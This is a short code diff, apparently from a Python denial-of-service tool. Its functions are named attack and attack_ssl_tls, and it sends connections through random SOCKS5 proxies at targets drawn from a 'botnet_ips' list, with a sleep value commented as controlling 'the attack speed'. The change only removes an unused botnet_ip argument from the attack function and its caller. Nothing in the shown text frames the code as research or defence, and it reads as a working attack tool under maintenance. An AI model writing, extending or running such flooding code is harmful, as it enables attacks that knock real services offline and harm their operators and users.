@@ -173,7 +173,7 @@ def attack_ssl_tls(target_url, target_port, socks5_proxy):
         except:
             pass
 
-def attack(target_url, target_port, socks5_proxy, botnet_ip):
+def attack(target_url, target_port, socks5_proxy):
     try:
         socks5_host, socks5_port = socks5_proxy.split(":")
         socks5_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -205,9 +205,8 @@ def start_attack():
         target_url = random.choice(botnet_ips)
         target_port = random.randint(1, 65535)
         socks5_proxy = random.choice(socks5_proxies)
-        botnet_ip = random.choice(botnet_ips)
 
-        pool.apply_async(attack, (target_url, target_port, socks5_proxy, botnet_ip))
+        pool.apply_async(attack, (target_url, target_port, socks5_proxy))
 
         time.sleep(0.1)  # Adjust the sleep time to control the attack speed
 
